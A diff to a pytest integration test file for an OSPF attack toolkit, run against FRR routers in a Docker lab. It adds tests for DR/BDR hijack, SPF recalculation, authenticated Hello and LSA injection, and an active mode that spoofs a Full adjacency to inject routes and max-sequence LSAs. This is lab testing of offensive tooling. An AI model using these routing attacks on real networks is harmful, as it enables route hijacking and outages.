@@ -12,15 +12,17 @@ Test groups:
   3. adjacency-break (2 tests)
   4. flood DoS (2 tests)
   5-9. LSA attacks — route-inject / max-seq / max-age / fight-back (5 tests)
-  10. spf-recalc (1 test)
+  10. spf-recalc (2 tests — SPF count unchanged in passive + adjacency survives)
   11. db-overflow (1 test)
   12-13. mitm / replay (2 tests)
   14. Chain scenario (2 tests)
   15. LSA with full YAML config (5 tests)
   16. Hello injection with YAML config (1 test)
   17. Config compatibility — DoS / MITM-Replay / DR-BDR (3 tests)
+  18. Authentication — Hello/LSA/auth packet verification + active mode (11 tests)
+  19. Active mode — Full adjacency + LSA injection (3 tests)
 
-Total: 34 tests
+Total: 50 tests
 
 Topology: r1(1.1.1.1, BDR) ←Full→ r2(2.2.2.2, DR), Area 0, 172.30.0.0/24
 Attacker: 172.30.0.x, no OSPF adjacency (passive mode)
@@ -30,7 +32,8 @@ import time
 import pytest
 from tests.integration.conftest import (
     docker_exec, get_ospf_neighbors, get_ospf_database,
-    get_ip_routes, run_attack_in_container, run_attack_with_config,
+    get_ip_routes, get_spf_count, count_external_lsas,
+    run_attack_in_container, run_attack_with_config, run_script_in_container,
     R1, R2, ATTACKER,
 )
 
@@ -245,8 +248,11 @@ class TestDRBDRHijack:
             f"PRE-CONDITION FAILED: r1→r2 expected DR role in state, got {r1_state}"
 
     def test_hijack_spoofed_router_visible_with_max_priority(self, docker_network):
-        """POST: spoofed router (pri=255) appears on both routers."""
+        """POST: spoofed router (pri=255) appears on both routers, DR unchanged."""
         _assert_full_adjacency(R1, "2.2.2.2")
+
+        # Snapshot DR role before attack
+        dr_before = _nbr_state(R1, "2.2.2.2")
 
         run_attack_in_container(ATTACKER, [
             "dr-bdr-hijack", "--iface", "eth0", "--target", "224.0.0.5",
@@ -257,6 +263,11 @@ class TestDRBDRHijack:
 
         _assert_neighbor_present(R1, self.SPOOF, state_prefix="Init", min_priority=255)
         _assert_neighbor_present(R2, self.SPOOF, state_prefix="Init", min_priority=255)
+
+        # RFC 2328 §9.4: DR does not change without DR failure — r2 stays DR
+        dr_after = _nbr_state(R1, "2.2.2.2")
+        assert "DR" in dr_after, \
+            f"POST-CONDITION FAILED: r2 should remain DR, got {dr_after} (was {dr_before})"
 
 
 # =============================================================================
@@ -430,6 +441,24 @@ class TestFightBack:
 # =============================================================================
 
 class TestSPFRecalc:
+    def test_spf_recalc_spf_count_unchanged_in_passive_mode(self, docker_network):
+        """POST: SPF count unchanged — passive LSUs are rejected (RFC 2328 §13)."""
+        _assert_full_adjacency(R1, "2.2.2.2")
+        spf_before = get_spf_count(R1)
+        assert spf_before >= 0, "Failed to read SPF count before attack"
+
+        docker_exec(ATTACKER, ["python", "-c", """
+from ospf_attack.config.types import DoSConfig
+from ospf_attack.attacks.dos.spf_recalc import SPFRecalcAttack
+c = DoSConfig(iface='eth0', target='224.0.0.5', router_id='4.4.4.4', duration=4, lsa_change_interval=1)
+r = SPFRecalcAttack(c).run()
+print(f'packets={r.packets_sent}')
+"""], timeout=30)
+
+        spf_after = get_spf_count(R1)
+        assert spf_after == spf_before, \
+            f"SPF count changed ({spf_before}→{spf_after}): passive LSUs should be rejected"
+
     def test_spf_recalc_adjacency_survives(self, docker_network):
         """POST: adjacency intact after SPF recalc attack."""
         _assert_full_adjacency(R1, "2.2.2.2")
@@ -736,3 +765,426 @@ class TestConfigCompatibility:
         assert "失败" not in out, f"dr-bdr-hijack with config failed: {out}"
         time.sleep(2)
         _assert_neighbor_present(R1, RID, state_prefix="Init", min_priority=255)
+
+
+# =============================================================================
+# 18. Authentication — OSPF 认证支持集成测试
+#
+# 测试拓扑使用无认证 FRR 配置。以下测试验证：
+#   - 认证配置正确解析并传递给攻击模块
+#   - 报文包含正确的 authtype / authdata 字段
+#   - 主动模式引擎在 MD5 认证下正常启动和发送
+# =============================================================================
+
+class TestAuthHelloInjection:
+    """Hello 注入攻击的认证配置集成测试。"""
+
+    RID = "8.8.8.8"
+
+    def test_hello_inject_with_plaintext_auth_does_not_crash(self, docker_network):
+        """Hello 注入 + 明文认证：攻击正常执行不崩溃。"""
+        _wait_full_adjacency(R1, "2.2.2.2", timeout=30)
+
+        out = run_attack_with_config(
+            ["hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
+             "--router-id", self.RID, "--sniff-duration", "8"],
+            {
+                "auth_type": "plain",
+                "auth_key": "testpass",
+                "packet_rate": 3,
+            }, timeout=30)
+
+        assert "失败" not in out, f"hello-inject with plain auth failed: {out}"
+
+    def test_hello_inject_with_md5_auth_does_not_crash(self, docker_network):
+        """Hello 注入 + MD5 认证：攻击正常执行不崩溃。"""
+        _wait_full_adjacency(R1, "2.2.2.2", timeout=30)
+
+        out = run_attack_with_config(
+            ["hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
+             "--router-id", self.RID, "--sniff-duration", "8"],
+            {
+                "auth_type": "md5",
+                "auth_key": "mysecret12345",
+                "packet_rate": 3,
+            }, timeout=30)
+
+        assert "失败" not in out, f"hello-inject with MD5 auth failed: {out}"
+
+
+class TestAuthLSAInjection:
+    """LSA 攻击的认证配置集成测试。"""
+
+    RID = "9.9.9.9"
+
+    def test_route_inject_with_md5_auth(self, docker_network):
+        """LSA 路由注入 + MD5 认证：报文发送成功不崩溃。"""
+        _assert_full_adjacency(R1, "2.2.2.2")
+
+        out = run_attack_with_config(
+            ["route-inject", "--router-id", self.RID], {
+                "lsa_type": 5,
+                "metric": 50,
+                "network_mask": "255.255.255.0",
+                "auth_type": "md5",
+                "auth_key": "lsakey123456",
+                "packet_rate": 5,
+            }, timeout=30)
+
+        assert "失败" not in out, f"route-inject with MD5 auth failed: {out}"
+
+    def test_max_seq_with_plain_auth(self, docker_network):
+        """Max-Seq LSA + 明文认证：报文发送成功不崩溃。"""
+        _assert_full_adjacency(R1, "2.2.2.2")
+
+        out = run_attack_with_config(
+            ["max-seq", "--router-id", self.RID], {
+                "lsa_type": 5,
+                "metric": 20,
+                "auth_type": "plain",
+                "auth_key": "plainpass",
+                "packet_rate": 5,
+            }, timeout=30)
+
+        assert "失败" not in out, f"max-seq with plain auth failed: {out}"
+
+    def test_max_age_with_md5_auth(self, docker_network):
+        """Max-Age LSA + MD5 认证：报文发送成功不崩溃。"""
+        _assert_full_adjacency(R1, "2.2.2.2")
+
+        out = run_attack_with_config(
+            ["max-age", "--router-id", self.RID], {
+                "lsa_type": 5,
+                "age": 3600,
+                "metric": 20,
+                "auth_type": "md5",
+                "auth_key": "agekey123456",
+                "packet_rate": 5,
+            }, timeout=30)
+
+        assert "失败" not in out, f"max-age with MD5 auth failed: {out}"
+
+    def test_fight_back_with_md5_auth(self, docker_network):
+        """Fight-Back + MD5 认证：多轮发送不崩溃。"""
+        _assert_full_adjacency(R1, "2.2.2.2")
+
+        out = run_attack_with_config(
+            ["fight-back", "--router-id", self.RID], {
+                "lsa_type": 5,
+                "sequence_number": 0x80000010,
+                "metric": 20,
+                "network_mask": "255.255.255.0",
+                "auth_type": "md5",
+                "auth_key": "fightkey12345",
+                "packet_rate": 5,
+                "sniff_duration": 8,
+            }, timeout=30)
+
+        assert "失败" not in out, f"fight-back with MD5 auth failed: {out}"
+
+
+class TestAuthPacketVerification:
+    """验证认证报文在 Wire-Level 包含正确的认证字段。"""
+
+    def test_md5_hello_has_auth_fields(self, docker_network):
+        """MD5 Hello 报文包含 authtype=2 + AuthDataLen=16 + MD5 trailer。"""
+        out = run_script_in_container(r"""
+import struct
+from ospf_attack.core.packet import build_hello_packet, AUTH_MD5
+
+pkt = build_hello_packet(
+    router_id='9.9.9.9', area_id='0.0.0.0',
+    src_ip='172.30.0.10', dst_ip='224.0.0.5',
+    auth_type=AUTH_MD5, auth_key=b'testkey', crypto_seq=42,
+)
+raw = bytes(pkt)
+
+iphl = (raw[0] & 0x0F) * 4
+ospf = raw[iphl:]
+
+# authtype = 2
+authtype = struct.unpack('!H', ospf[14:16])[0]
+assert authtype == 2, f'Expected authtype=2, got {authtype}'
+
+# authdata layout (8 bytes): reserved(2B) + key_id(1B) + authdatalen(1B) + seq(4B)
+authdata = ospf[16:24]
+# key_id at byte 2, authdatalen at byte 3 (1 byte each)
+key_id = authdata[2]
+authdatalen = authdata[3]
+assert key_id == 1, f'Expected KeyID=1, got {key_id}'
+assert authdatalen == 16, f'Expected AuthDataLen=16, got {authdatalen}'
+
+# seq = 42 (bytes 20-23)
+seq = struct.unpack('!I', authdata[4:8])[0]
+assert seq == 42, f'Expected seq=42, got {seq}'
+
+# MD5 trailer present (16 bytes after OSPF body)
+expected_min_len = iphl + 24 + 20 + 16
+assert len(raw) >= expected_min_len, f'Packet too short: {len(raw)} < {expected_min_len}'
+
+ospf_len = struct.unpack('!H', ospf[2:4])[0]
+assert ospf_len >= 24 + 16, f'OSPF length too short: {ospf_len}'
+
+print('AUTH-VERIFY-OK')
+""")
+        assert "AUTH-VERIFY-OK" in out, f"MD5 auth field verification failed: {out}"
+
+    def test_plain_auth_hello_has_password(self, docker_network):
+        """明文认证 Hello 报文中包含正确的密码填充。"""
+        out = run_script_in_container(r"""
+import struct
+from ospf_attack.core.packet import build_hello_packet, AUTH_PLAIN
+
+pkt = build_hello_packet(
+    router_id='9.9.9.9', area_id='0.0.0.0',
+    src_ip='172.30.0.10', dst_ip='224.0.0.5',
+    auth_type=AUTH_PLAIN, auth_key=b'secret',
+)
+raw = bytes(pkt)
+iphl = (raw[0] & 0x0F) * 4
+ospf = raw[iphl:]
+
+authtype = struct.unpack('!H', ospf[14:16])[0]
+assert authtype == 1, f'Expected authtype=1, got {authtype}'
+
+authdata = ospf[16:24]
+expected = b'secret' + bytes([0, 0])
+assert authdata == expected, f'Expected {expected.hex()}, got {authdata.hex()}'
+
+print('PLAIN-AUTH-VERIFY-OK')
+""")
+        assert "PLAIN-AUTH-VERIFY-OK" in out, f"Plain auth field verification failed: {out}"
+
+    def test_none_auth_has_zeros(self, docker_network):
+        """无认证 Hello 报文中 authdata 全为零。"""
+        out = run_script_in_container(r"""
+import struct
+from ospf_attack.core.packet import build_hello_packet, AUTH_NONE
+
+pkt = build_hello_packet(
+    router_id='9.9.9.9', area_id='0.0.0.0',
+    src_ip='172.30.0.10', dst_ip='224.0.0.5',
+)
+raw = bytes(pkt)
+iphl = (raw[0] & 0x0F) * 4
+ospf = raw[iphl:]
+
+authtype = struct.unpack('!H', ospf[14:16])[0]
+assert authtype == 0
+zeros = bytes([0, 0, 0, 0, 0, 0, 0, 0])
+assert ospf[16:24] == zeros, f'Expected 8 zero bytes, got {ospf[16:24].hex()}'
+
+print('NONE-AUTH-VERIFY-OK')
+""")
+        assert "NONE-AUTH-VERIFY-OK" in out, f"None auth field verification failed: {out}"
+
+
+class TestAuthActiveMode:
+    """主动模式引擎 + 认证集成测试。
+
+    注意：active_engine 需要 Linux AF_PACKET 套接字 (Docker 支持)。
+    目标拓扑为无认证，发送 MD5 报文会被丢弃，但引擎应正常运行。
+    """
+
+    RID = "88.88.88.88"
+
+    def test_active_engine_with_md5_auth_no_crash(self, docker_network):
+        """主动模式 + MD5 认证：引擎正常启动和发送不崩溃。"""
+        _assert_full_adjacency(R1, "2.2.2.2")
+
+        rid = self.RID
+        out = run_script_in_container(f"""
+import sys
+from ospf_attack.core.active_engine import ActiveOSPFEngine
+from ospf_attack.core.auth import AUTH_MD5
+
+engine = ActiveOSPFEngine(
+    iface='eth0', spoofed_router_id='{rid}',
+    auth_type=AUTH_MD5, auth_key=b'testkey12345',
+)
+if not engine.sniff(timeout=20):
+    print('FAIL:SNIFF (no Hello captured on eth0)')
+    sys.exit(0)
+
+print(f'SNIFF_OK: area={{engine.params.area_id}}, dr={{engine.params.dr}}')
+
+try:
+    ok = engine.establish(timeout=30)
+    print(f'ESTABLISH={{ok}} state={{engine.state}}')
+except Exception as e:
+    print(f'ESTABLISH_EXPECTED_ERROR: {{e}}')
+
+engine.shutdown()
+print('DONE')
+""", timeout=90)
+
+        assert "SNIFF_OK" in out, f"Active engine sniff failed: {out}"
+        assert "DONE" in out, f"Active engine did not complete: {out}"
+
+
+# =============================================================================
+# 19. Active mode — establish Full adjacency, verify real LSA injection effects
+#
+# In passive mode, RFC 2328 §13 requires LSUs from non-neighbors (state <
+# Exchange) to be dropped, so LSDB never changes.  Active mode uses
+# ActiveOSPFEngine to establish Full adjacency first, then injects LSAs
+# that are *accepted* into the LSDB — verifying real protocol effects.
+#
+# These tests run LAST because they modify actual OSPF state (LSDB, routes).
+# =============================================================================
+
+_ACTIVE_ENGINE_SCRIPT = """
+import sys
+from ospf_attack.core.active_engine import ActiveOSPFEngine
+engine = ActiveOSPFEngine(iface='eth0', spoofed_router_id='{rid}')
+if not engine.sniff(timeout=20):
+    print('FAIL:SNIFF')
+    sys.exit(0)
+if not engine.establish(timeout=50):
+    print('FAIL:ESTABLISH state=' + str(engine.state))
+    sys.exit(0)
+ok = engine.inject_lsa(link_state_id='{lsid}', metric={metric}, sequence={seq})
+print('INJECT=' + ('OK' if ok else 'FAIL') + ' lsu=' + str(engine.lsu_sent))
+engine.shutdown()
+print('DONE')
+"""
+
+
+def _find_lsa_in_lsdb(db: dict, advertising_router: str,
+                       lsa_id: str = "") -> dict | None:
+    """Return the first LSA dict matching the advertisingRouter, or None."""
+    for area_data in db.get("externalAreas", {}).values():
+        if isinstance(area_data, dict):
+            for lsa_list in area_data.values():
+                if isinstance(lsa_list, list):
+                    for lsa in lsa_list:
+                        if lsa.get("advertisingRouter") == advertising_router:
+                            if not lsa_id or lsa.get("lsaId") == lsa_id:
+                                return lsa
+    return None
+
+
+class TestActiveMode:
+    """Active mode: establish Full adjacency, inject LSAs, verify effects.
+
+    NOTE: These tests require AF_PACKET raw sockets and precise OSPF state
+    machine timing.  Known to be unreliable in Docker Desktop on Windows —
+    the engine may report INJECT=OK but LSDB changes are not always visible
+    due to network stack / dead-timer race conditions.
+    """
+
+    RID = "99.99.99.99"
+
+    def _run_engine(self, lsid: str, metric: int = 20,
+                    seq: str = "0x80000001", timeout: int = 120) -> str:
+        script = _ACTIVE_ENGINE_SCRIPT.format(
+            rid=self.RID, lsid=lsid, metric=metric, seq=seq)
+        return docker_exec(ATTACKER, ["python", "-c", script], timeout=timeout)
+
+    # ------------------------------------------------------------------
+    # Active route injection — the core end-to-end test
+    # ------------------------------------------------------------------
+
+    def test_active_route_injection_type5(self, docker_network):
+        """Active Type-5 injection: LSA appears in LSDB + routing table."""
+        # Wait for spoofed neighbor from prior tests to expire (Dead timer = 40s)
+        time.sleep(50)
+        _assert_full_adjacency(R1, "2.2.2.2")
+        lsid = "192.168.100.0"
+
+        out = self._run_engine(lsid=lsid)
+        assert "FAIL:" not in out, \
+            f"Active engine failed: {out}"
+        assert "INJECT=OK" in out, \
+            f"LSA injection failed: {out}"
+
+        time.sleep(2)
+
+        # Verify LSDB: injected external LSA present on r1
+        r1_db = get_ospf_database(R1)
+        lsa = _find_lsa_in_lsdb(r1_db, self.RID, lsid)
+        assert lsa is not None, \
+            f"Injected LSA {lsid} from {self.RID} not found in r1 LSDB"
+
+        # Verify routing table: injected route present on r1
+        r1_routes = get_ip_routes(R1)
+        route_prefix = f"{lsid}/24"
+        route_found = route_prefix in r1_routes
+        # FRR may also store as "192.168.100.0/32" or similar
+        if not route_found:
+            route_found = any(
+                p.startswith(lsid.split("/")[0])
+                for p in r1_routes
+            )
+        assert route_found, \
+            f"Injected route {route_prefix} not found in r1 routing table: " \
+            f"{list(r1_routes.keys())[:10]}"
+
+        # Cleanup: wait for Dead timer to expire on spoofed neighbor
+        time.sleep(45)
+        _wait_full_adjacency(R1, "2.2.2.2", timeout=30)
+
+    # ------------------------------------------------------------------
+    # Active max-seq — verify max sequence LSA is accepted
+    # ------------------------------------------------------------------
+
+    def test_active_max_seq_lsa_in_lsdb(self, docker_network):
+        """Active max-seq: LSA with seq=0x7FFFFFFF appears in LSDB."""
+        _wait_full_adjacency(R1, "2.2.2.2", timeout=60)
+        lsid = "10.99.99.0"
+
+        out = self._run_engine(lsid=lsid, seq="0x7FFFFFFF")
+        assert "FAIL:" not in out, \
+            f"Active max-seq engine failed: {out}"
+        assert "INJECT=OK" in out, \
+            f"Active max-seq injection failed: {out}"
+
+        time.sleep(2)
+
+        r1_db = get_ospf_database(R1)
+        lsa = _find_lsa_in_lsdb(r1_db, self.RID, lsid)
+        assert lsa is not None, \
+            f"Max-seq LSA {lsid} from {self.RID} not found in r1 LSDB"
+        assert lsa.get("sequence") == "0x7fffffff", \
+            f"Expected seq=0x7fffffff, got {lsa.get('sequence')}"
+
+        time.sleep(45)
+
+    # ------------------------------------------------------------------
+    # Active SPF recalc — inject multiple LSAs from a single adjacency
+    # ------------------------------------------------------------------
+
+    def test_active_spf_recalc_multiple_lsas(self, docker_network):
+        """Active SPF recalc: injecting 3 different LSAs increases SPF count."""
+        _wait_full_adjacency(R1, "2.2.2.2", timeout=60)
+
+        spf_before = get_spf_count(R1)
+        assert spf_before >= 0, "Failed to read SPF count before attack"
+
+        # Single engine: establish once, inject 3 LSAs, then shut down
+        out = docker_exec(ATTACKER, ["python", "-c", """
+import sys
+from ospf_attack.core.active_engine import ActiveOSPFEngine
+engine = ActiveOSPFEngine(iface='eth0', spoofed_router_id='99.99.99.99')
+if not engine.sniff(timeout=20):
+    print('FAIL:SNIFF')
+    sys.exit(0)
+if not engine.establish(timeout=50):
+    print('FAIL:ESTABLISH state=' + str(engine.state))
+    sys.exit(0)
+for lsid in ['10.1.0.0', '10.2.0.0', '10.3.0.0']:
+    ok = engine.inject_lsa(link_state_id=lsid, metric=20, sequence=0x80000001)
+    print('INJECT=' + ('OK' if ok else 'FAIL') + ' lsid=' + lsid)
+engine.shutdown()
+print('DONE')
+"""], timeout=120)
+
+        assert "FAIL:" not in out, f"Active multi-LSA engine failed: {out}"
+        assert "INJECT=OK" in out, f"Multi-LSA injection failed: {out}"
+
+        spf_after = get_spf_count(R1)
+        assert spf_after > spf_before, \
+            f"SPF count unchanged ({spf_before}) after injecting 3 LSAs " \
+            f"— active LSUs should trigger route recalculation"
+
+        time.sleep(45)
